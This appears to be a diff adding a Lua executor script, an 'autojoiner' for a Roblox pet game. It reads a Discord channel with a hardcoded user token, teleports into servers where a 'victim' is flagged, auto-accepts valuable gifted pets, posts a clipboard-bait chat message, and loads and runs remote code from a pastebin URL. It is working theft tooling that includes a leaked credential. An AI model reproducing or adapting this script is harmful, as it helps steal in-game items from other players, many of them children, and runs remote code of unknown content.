@@ -1,0 +1,775 @@
+--[[ AUTOJOINER ]]
+local Config = {
+    -- Discord Settings
+    Token = "MjE4MDA5NDU5NDE3NTQ2NzUy.Gm3bt0.O5x3A0aIHkgy7psKcBK02sRQwCcyh1qSVYxosU",
+    ChannelId = "1396492598230650900",
+    
+    -- Pet Settings
+    Pets = {
+	"Raccoon",
+	"Kitsune",
+	"T-Rex",
+	"Mimic Octopus",
+	"Butterfly",
+	"Fennec Fox",
+	"Dragonfly",
+	"Disco Bee",
+	"Queen Bee",
+	"Chicken Zombie"
+    },
+    MinPetKg = 1,
+    
+    -- Timing Settings
+    GiftCooldown = 6,
+    DiscordCheckInterval = 0.1,
+    PetWaitTimeout = 10,
+    LoadTimeout = 15,
+}
+
+
+-- Services Cache
+local Services = {
+    Players = game:GetService("Players"),
+    HttpService = game:GetService("HttpService"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+    TeleportService = game:GetService("TeleportService"),
+    TextChatService = game:GetService("TextChatService"),
+    VirtualUser = game:GetService("VirtualUser"),
+    VirtualInputManager = game:GetService("VirtualInputManager"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage")
+}
+
+-- Player References
+local LocalPlayer = Services.Players.LocalPlayer
+
+-- Function to refresh LocalPlayer reference
+local function RefreshLocalPlayer()
+    LocalPlayer = Services.Players.LocalPlayer
+    return LocalPlayer
+end
+
+-- Logging System
+local Logger = {}
+Logger.LogLevel = {
+    DEBUG = 1,
+    INFO = 2,
+    WARN = 3,
+    ERROR = 4
+}
+Logger.CurrentLevel = Logger.LogLevel.INFO
+
+function Logger:Log(level, message, ...)
+    if level < self.CurrentLevel then return end
+    
+    local prefix = {
+        [self.LogLevel.DEBUG] = "🔍 [DEBUG]",
+        [self.LogLevel.INFO] = "ℹ️ [INFO]",
+        [self.LogLevel.WARN] = "⚠️ [WARN]", 
+        [self.LogLevel.ERROR] = "❌ [ERROR]"
+    }
+    
+    local timestamp = os.date("%H:%M:%S")
+    local formatted = string.format("[%s] %s %s", timestamp, prefix[level] or "", message)
+    
+    if select("#", ...) > 0 then
+        formatted = string.format(formatted, ...)
+    end
+    
+    print(formatted)
+end
+
+function Logger:Debug(...) self:Log(self.LogLevel.DEBUG, ...) end
+function Logger:Info(...) self:Log(self.LogLevel.INFO, ...) end  
+function Logger:Warn(...) self:Log(self.LogLevel.WARN, ...) end
+function Logger:Error(...) self:Log(self.LogLevel.ERROR, ...) end
+
+-- File System Utilities
+local FileSystem = {}
+
+function FileSystem:EnsureFile(filename, defaultContent)
+    if not isfile(filename) then
+        writefile(filename, defaultContent)
+        Logger:Info("Created file: %s", filename)
+    end
+end
+
+function FileSystem:ReadJSON(filename, default)
+    local success, result = pcall(function()
+        local content = readfile(filename)
+        return Services.HttpService:JSONDecode(content)
+    end)
+    
+    if success then
+        return result
+    else
+        Logger:Warn("Failed to read JSON from %s: %s", filename, result)
+        return default
+    end
+end
+
+function FileSystem:WriteJSON(filename, data)
+    local success, err = pcall(function()
+        local json = Services.HttpService:JSONEncode(data)
+        writefile(filename, json)
+    end)
+    
+    if not success then
+        Logger:Error("Failed to write JSON to %s: %s", filename, err)
+    end
+    
+    return success
+end
+
+-- State Management
+local State = {
+    IsProcessingGift = false,
+    GiftingActive = false,
+    LastGiftTime = 0,
+    RobloxFocusStatus = nil,
+    LastDiscordMessageId = nil,
+    DidVictimLeave = false,
+    AutoJoinTimer = 0,
+    VictimUser = "victim username",
+    JoinedIds = {},
+    IsInitialized = false
+}
+
+function State:Initialize()
+    if self.IsInitialized then return end
+    
+    -- Setup file system
+    FileSystem:EnsureFile("user_gag.txt", "victim username")
+    FileSystem:EnsureFile("joined_ids.txt", "[]")
+    
+    -- Load saved data
+    self.VictimUser = readfile("user_gag.txt")
+    self.JoinedIds = FileSystem:ReadJSON("joined_ids.txt", {})
+    
+    self.IsInitialized = true
+    Logger:Info("State initialized successfully")
+end
+
+function State:SaveJoinedId(messageId)
+    table.insert(self.JoinedIds, tostring(messageId))
+    FileSystem:WriteJSON("joined_ids.txt", self.JoinedIds)
+end
+
+-- Utility Functions
+local Utils = {}
+
+function Utils:WaitForChild(parent, childName, timeout)
+    timeout = timeout or Config.LoadTimeout
+    local child = parent:WaitForChild(childName, timeout)
+    if not child then
+        Logger:Error("Failed to find child '%s' in parent '%s' within %d seconds", 
+                    childName, parent.Name, timeout)
+    end
+    return child
+end
+
+-- IMPROVED PET NAME EXTRACTION WITH MUTATION DETECTION
+function Utils:ExtractBaseName(fullName)
+    if not fullName or type(fullName) ~= "string" then
+        Logger:Warn("Invalid pet name provided: %s", tostring(fullName))
+        return ""
+    end
+    
+    -- Remove weight/KG brackets first
+    local base = fullName:gsub("%s*%[.-%]", "")
+    base = base:match("^%s*(.-)%s*$") or ""
+    
+    -- Pet mutations list
+    local petMutations = {
+        'Shiny',
+        'Inverted', 
+        'Windy',
+        'Frozen',
+        'Golden',
+        'Tiny',
+        'Mega',
+        'IronSkin',
+        'Radiant',
+        'Ascended',
+    }
+    
+    -- Remove mutations from the beginning of the name
+    for _, mutation in ipairs(petMutations) do
+        local mutationPattern = "^" .. mutation .. "%s+"
+        if base:match(mutationPattern) then
+            base = base:gsub(mutationPattern, "")
+            Logger:Debug("Removed mutation '%s' from pet name: %s", mutation, fullName)
+            break
+        end
+    end
+    
+    -- Clean up any remaining whitespace
+    base = base:gsub("^%s+", ""):gsub("%s+$", "")
+    
+    if base == "" then
+        base = fullName
+    end
+    
+    Logger:Debug("Extracted base name: '%s' from full name: '%s'", base, fullName)
+    return base
+end
+
+function Utils:ExtractPetKG(fullName)
+    if not fullName or type(fullName) ~= "string" then return 0 end
+    
+    local kgString = fullName:match("%[(%d+)kg%]")
+    return tonumber(kgString) or 0
+end
+
+function Utils:WaitForExactPet(fullName, backpack)
+    Logger:Debug("Waiting for pet: %s", fullName)
+    local elapsed = 0
+    
+    while elapsed < Config.PetWaitTimeout do
+        for _, pet in ipairs(backpack:GetChildren()) do
+            if pet.Name == fullName then
+                Logger:Info("Pet found in backpack: %s", fullName)
+                return true
+            end
+        end
+        task.wait(0.5)
+        elapsed = elapsed + 0.5
+    end
+    
+    Logger:Warn("Pet not found after %d seconds: %s", Config.PetWaitTimeout, fullName)
+    return false
+end
+
+function Utils:IsPetAcceptable(fullName)
+    local baseName = self:ExtractBaseName(fullName)
+    local petKG = self:ExtractPetKG(fullName)
+    
+    local isWhitelisted = table.find(Config.Pets, baseName) ~= nil
+    local isHighKG = petKG >= Config.MinPetKg
+    
+    Logger:Debug("Pet check - Base: '%s', KG: %d, Whitelisted: %s, HighKG: %s", 
+                baseName, petKG, tostring(isWhitelisted), tostring(isHighKG))
+    
+    return isWhitelisted or isHighKG, baseName, petKG, isWhitelisted, isHighKG
+end
+
+-- Discord Integration with Better Error Handling
+local Discord = {}
+
+function Discord:MakeRequest(endpoint, method, headers, body)
+    method = method or "GET"
+    headers = headers or {}
+    
+    -- Validate token and channel
+    if not Config.Token or Config.Token == "" then
+        Logger:Error("Discord token is missing or empty!")
+        return nil
+    end
+    
+    if not Config.ChannelId or Config.ChannelId == "" then
+        Logger:Error("Discord channel ID is missing or empty!")
+        return nil
+    end
+    
+    -- Default headers with proper authorization
+    headers["Authorization"] = Config.Token
+    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    headers["Content-Type"] = "application/json"
+    
+    local url = "https://discord.com/api/v9/" .. endpoint
+    
+    local requestData = {
+        Url = url,
+        Method = method,
+        Headers = headers
+    }
+    
+    if body then
+        requestData.Body = body
+    end
+    
+    Logger:Debug("Making Discord request to: %s", url)
+    Logger:Debug("Headers: %s", Services.HttpService:JSONEncode(headers))
+    
+    -- Try multiple request methods
+    local httpMethods = {
+        function() return request end,
+        function() return http_request end,
+        function() return syn and syn.request end,
+        function() return fluxus and fluxus.request end
+    }
+    
+    local httpFunc = nil
+    for _, method in ipairs(httpMethods) do
+        local success, func = pcall(method)
+        if success and func then
+            httpFunc = func
+            break
+        end
+    end
+    
+    if not httpFunc then
+        Logger:Error("No HTTP request function available!")
+        return nil
+    end
+    
+    local success, response = pcall(httpFunc, requestData)
+    
+    if not success then
+        Logger:Error("Discord request failed: %s", response)
+        return nil
+    end
+    
+    Logger:Debug("Discord response status: %s", tostring(response.StatusCode))
+    if response.StatusCode ~= 200 then
+        Logger:Error("Discord API error - Status: %s, Body: %s", 
+                    tostring(response.StatusCode), tostring(response.Body))
+    end
+    
+    return response
+end
+
+function Discord:TestConnection()
+    Logger:Info("Testing Discord connection...")
+    
+    -- Test with a simple request to verify token and channel access
+    local endpoint = string.format("channels/%s", Config.ChannelId)
+    local response = self:MakeRequest(endpoint)
+    
+    if response and response.StatusCode == 200 then
+        Logger:Info("✅ Discord connection successful!")
+        local success, channelData = pcall(Services.HttpService.JSONDecode, Services.HttpService, response.Body)
+        if success and channelData then
+            Logger:Info("Channel name: %s", channelData.name or "Unknown")
+        end
+        return true
+    else
+        Logger:Error("❌ Discord connection failed!")
+        if response then
+            Logger:Error("Status Code: %s", response.StatusCode)
+            Logger:Error("Response: %s", response.Body)
+        end
+        return false
+    end
+end
+
+function Discord:GetLatestMessage()
+    local endpoint = string.format("channels/%s/messages?limit=1", Config.ChannelId)
+    local response = self:MakeRequest(endpoint)
+    
+    if not response then
+        Logger:Error("No response from Discord API")
+        return nil
+    end
+    
+    if response.StatusCode ~= 200 then
+        Logger:Error("Failed to fetch Discord messages. Status: %s, Body: %s", 
+                    response.StatusCode, response.Body or "No body")
+        return nil
+    end
+    
+    local success, messages = pcall(Services.HttpService.JSONDecode, Services.HttpService, response.Body)
+    if not success then
+        Logger:Error("Failed to decode Discord response: %s", messages)
+        return nil
+    end
+    
+    if not messages or #messages == 0 then
+        Logger:Debug("No messages found in channel")
+        return nil
+    end
+    
+    Logger:Debug("Retrieved %d message(s) from Discord", #messages)
+    return messages[1]
+end
+
+function Discord:ProcessAutoJoin()
+    -- Skip if gifting is active and within cooldown
+    if State.GiftingActive then
+        local timeSinceLastGift = os.time() - State.LastGiftTime
+        if timeSinceLastGift < Config.GiftCooldown then
+            return
+        else
+            Logger:Info("Gifting cooldown expired, resuming Discord checks")
+            State.GiftingActive = false
+        end
+    end
+    
+    local message = self:GetLatestMessage()
+    if not message then return end
+    
+    -- Skip if already processed
+    local messageId = tostring(message.id)
+    if messageId == State.LastDiscordMessageId or 
+       table.find(State.JoinedIds, messageId) then
+        Logger:Debug("Message already processed: %s", messageId)
+        return
+    end
+    
+    -- Parse teleport data
+    local content = message.content or ""
+    Logger:Debug("Message content: %s", content)
+    
+    local placeId, jobId = content:match('TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
+    
+    if placeId and jobId then
+        Logger:Info("Found teleport link - PlaceId: %s, JobId: %s", placeId, jobId)
+        
+        State.LastDiscordMessageId = messageId
+        State:SaveJoinedId(messageId)
+        writefile("user_gag.txt", "unknown")
+        
+        -- Attempt teleport
+        local success, err = pcall(function()
+            Services.TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
+        end)
+        
+        if not success then
+            Logger:Error("Teleport failed: %s", err)
+        else
+            Logger:Info("Teleport initiated successfully!")
+        end
+    else
+        Logger:Debug("No teleport link found in message content")
+    end
+end
+
+-- Pet Gifting Handler
+local GiftHandler = {}
+
+function GiftHandler:Initialize()
+    local gameEvents = Utils:WaitForChild(Services.ReplicatedStorage, "GameEvents")
+    if not gameEvents then
+        Logger:Error("GameEvents not found, gift handling disabled")
+        return false
+    end
+    
+    self.RemoteEvents = {
+        PetGiftingService = Utils:WaitForChild(gameEvents, "PetGiftingService"),
+        Favorite_Item = Utils:WaitForChild(gameEvents, "Favorite_Item"), 
+        GiftPet = Utils:WaitForChild(gameEvents, "GiftPet"),
+        AcceptPetGift = Utils:WaitForChild(gameEvents, "AcceptPetGift")
+    }
+    
+    if self.RemoteEvents.GiftPet then
+        self:SetupGiftListener()
+        Logger:Info("Gift handler initialized successfully")
+        return true
+    else
+        Logger:Error("GiftPet remote event not found")
+        return false
+    end
+end
+
+function GiftHandler:SetupGiftListener()
+    self.RemoteEvents.GiftPet.OnClientEvent:Connect(function(giftID, fullName, sender)
+        self:HandleGiftReceived(giftID, fullName, sender)
+    end)
+end
+
+function GiftHandler:HandleGiftReceived(giftID, fullName, sender)
+    Logger:Info("Gift received - ID: %s, Pet: %s, From: %s", giftID, fullName, sender)
+    
+    -- Update gifting state
+    State.GiftingActive = true
+    State.LastGiftTime = os.time()
+    
+    -- Validate pet with improved mutation detection
+    local acceptable, baseName, petKG, isWhitelisted, isHighKG = Utils:IsPetAcceptable(fullName)
+    
+    if not acceptable then
+        Logger:Info("Rejecting pet '%s' (Base: '%s', KG: %d) - not whitelisted and below minimum KG", 
+                   fullName, baseName, petKG)
+        return
+    end
+    
+    local reason = isWhitelisted and "whitelisted" or "high KG"
+    Logger:Info("Accepting pet '%s' (Base: '%s', KG: %d) - %s", fullName, baseName, petKG, reason)
+    
+    -- Process gift
+    self:ProcessGift(giftID, fullName, sender)
+end
+
+function GiftHandler:ProcessGift(giftID, fullName, sender)
+    -- Wait for any ongoing gift processing
+    while State.IsProcessingGift do
+        task.wait(0.1)
+    end
+    
+    State.IsProcessingGift = true
+    
+    local success, err = pcall(function()
+        if not self.RemoteEvents.AcceptPetGift then
+            error("AcceptPetGift remote event not available")
+        end
+        
+        self.RemoteEvents.AcceptPetGift:FireServer(true, giftID)
+        Logger:Info("Gift accepted - ID: %s", giftID)
+        
+        -- Wait for pet to appear in backpack
+        local backpack = LocalPlayer:FindFirstChild("Backpack")
+        if backpack then
+            Utils:WaitForExactPet(fullName, backpack)
+        end
+    end)
+    
+    if not success then
+        Logger:Error("Failed to process gift: %s", err)
+    end
+    
+    State.IsProcessingGift = false
+end
+
+-- Auto Gift Acceptor
+local GiftAcceptor = {}
+
+function GiftAcceptor:Start()
+    task.spawn(function()
+        self:Run()
+    end)
+end
+
+function GiftAcceptor:Run()
+    local playerGui = Utils:WaitForChild(LocalPlayer, "PlayerGui")
+    if not playerGui then return end
+    
+    local giftNotification = Utils:WaitForChild(playerGui, "Gift_Notification")
+    if not giftNotification then 
+        Logger:Warn("Gift_Notification GUI not found")
+        return 
+    end
+    
+    local frame = Utils:WaitForChild(giftNotification, "Frame")
+    if not frame then return end
+    
+    Logger:Info("Auto gift acceptor started")
+    
+    while task.wait(0.1) do
+        for _, child in pairs(frame:GetChildren()) do
+            if child:IsA("ImageLabel") then
+                local success, err = pcall(function()
+                    local holder = child:FindFirstChild("Holder", true)
+                    if not holder then return end
+                    
+                    local innerFrame = holder:FindFirstChild("Frame", true)
+                    if not innerFrame then return end
+                    
+                    local acceptButton = innerFrame:FindFirstChild("Accept", true)
+                    if acceptButton and acceptButton:IsA("ImageButton") then
+                        replicatesignal(acceptButton.MouseButton1Click)
+                    end
+                end)
+                
+                if not success then
+                    Logger:Debug("Gift accept attempt failed: %s", err)
+                end
+            end
+        end
+    end
+end
+
+-- Main Script Logic
+local function ValidateConfig()
+    if not Config.Token or Config.Token == "" then
+        Logger:Error("Discord token is missing!")
+        LocalPlayer:Kick("Discord token must be configured")
+        return false
+    end
+    
+    if not Config.ChannelId or Config.ChannelId == "" then
+        Logger:Error("Discord channel ID is missing!")
+        LocalPlayer:Kick("Discord channel ID must be configured")
+        return false
+    end
+    
+    return true
+end
+
+local function WaitForGameLoad()
+    Logger:Info("Waiting for game to load...")
+    
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+    
+    -- Wait for LocalPlayer to be valid (important after teleporting)
+    while not LocalPlayer or not LocalPlayer.Parent do
+        LocalPlayer = Services.Players.LocalPlayer
+        if not LocalPlayer then
+            task.wait(0.1)
+        end
+    end
+    
+    Logger:Info("LocalPlayer validated")
+    
+    -- Spam E button for 9 seconds
+    Logger:Info("Starting E button spam for 9 seconds...")
+    local spamStartTime = tick()
+    local spamDuration = 9
+    
+    task.spawn(function()
+        while tick() - spamStartTime < spamDuration do
+            local success, err = pcall(function()
+                Services.VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+                task.wait(0.01)
+                Services.VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+            end)
+            
+            if not success then
+                Logger:Warn("E key spam failed: %s", err)
+            end
+            
+            task.wait(0.05)
+        end
+        Logger:Info("E button spam completed")
+    end)
+    
+    task.wait(spamDuration)
+    
+    -- Wait for player data with proper error handling
+    local attributes = {"DataFullyLoaded", "Finished_Loading", "Loading_Screen_Finished"}
+    
+    for _, attr in ipairs(attributes) do
+        local success, err = pcall(function()
+            while not LocalPlayer or LocalPlayer:GetAttribute(attr) ~= true do
+                if not LocalPlayer then
+                    LocalPlayer = Services.Players.LocalPlayer
+                    task.wait(0.1)
+                    continue
+                end
+                
+                LocalPlayer:GetAttributeChangedSignal(attr):Wait()
+            end
+        end)
+        
+        if success then
+            Logger:Debug("Attribute loaded: %s", attr)
+        else
+            Logger:Warn("Failed to wait for attribute %s: %s", attr, err)
+        end
+    end
+    
+    Logger:Info("Game fully loaded")
+end
+
+local function SetupIdleHandler()
+    LocalPlayer.Idled:Connect(function()
+        Services.VirtualUser:CaptureController()
+        Services.VirtualUser:ClickButton2(Vector2.new())
+    end)
+end
+
+local function SetupActivityMonitor()
+    Services.RunService.Heartbeat:Connect(function()
+        local currentStatusIsInactive = false
+        local lastStatus = State.RobloxFocusStatus
+        
+        if lastStatus == nil or lastStatus ~= currentStatusIsInactive then
+            State.RobloxFocusStatus = currentStatusIsInactive
+            Logger:Debug("Activity status updated")
+        end
+    end)
+end
+
+local function SendInitialMessages()
+    local textChannel = Services.TextChatService.TextChannels.RBXGeneral
+    
+    local messages = {"Yo gng check yo clipboard", "GGS", "GGS"}
+    
+    for _, message in ipairs(messages) do
+        local success, err = pcall(function()
+            textChannel:SendAsync(message)
+        end)
+        
+        if not success then
+            Logger:Warn("Failed to send message '%s': %s", message, err)
+        end
+        
+        task.wait(1)
+    end
+end
+
+local function StartMainLoop()
+    Logger:Info("Starting main auto-join loop")
+    
+    -- Test Discord connection first
+    if not Discord:TestConnection() then
+        Logger:Error("Discord connection test failed! Auto-join disabled.")
+        return
+    end
+    
+    while task.wait(Config.DiscordCheckInterval) do
+        local success, err = pcall(function()
+            Discord:ProcessAutoJoin()
+        end)
+        
+        if not success then
+            Logger:Error("Auto-join error: %s", err)
+            task.wait(1)
+        end
+    end
+end
+
+-- Load external scripts
+local function LoadExternalScripts()
+    if typeof(game.HttpGet) ~= "function" then
+        Logger:Warn("HttpGet not available, skipping external scripts")
+        return
+    end
+    
+    local scripts = {
+        "https://pastebin.com/raw/xBLu3qtF"
+    }
+    
+    for _, url in ipairs(scripts) do
+        local success, err = pcall(function()
+            loadstring(game:HttpGet(url, true))()
+        end)
+        
+        if not success then
+            Logger:Warn("Failed to load external script %s: %s", url, err)
+        end
+    end
+end
+
+-- Main Execution
+local function Main()
+    Logger:Info("=== Pet Gifting Automation Script Started ===")
+    
+    -- Refresh LocalPlayer reference
+    RefreshLocalPlayer()
+    
+    -- Validate configuration
+    if not ValidateConfig() then return end
+    
+    -- Initialize state
+    State:Initialize()
+    
+    -- Wait for game to load
+    WaitForGameLoad()
+    
+    -- Setup handlers
+    SetupIdleHandler()
+    SetupActivityMonitor()
+    
+    -- Initialize gift handler
+    if not GiftHandler:Initialize() then
+        Logger:Error("Failed to initialize gift handler")
+        return
+    end
+    
+    -- Start background services
+    GiftAcceptor:Start()
+    
+    -- Load external scripts
+    LoadExternalScripts()
+    
+    -- Send initial chat messages
+    SendInitialMessages()
+    
+    -- Start main loop
+    StartMainLoop()
+end
+
+-- Execute main function
+Main()
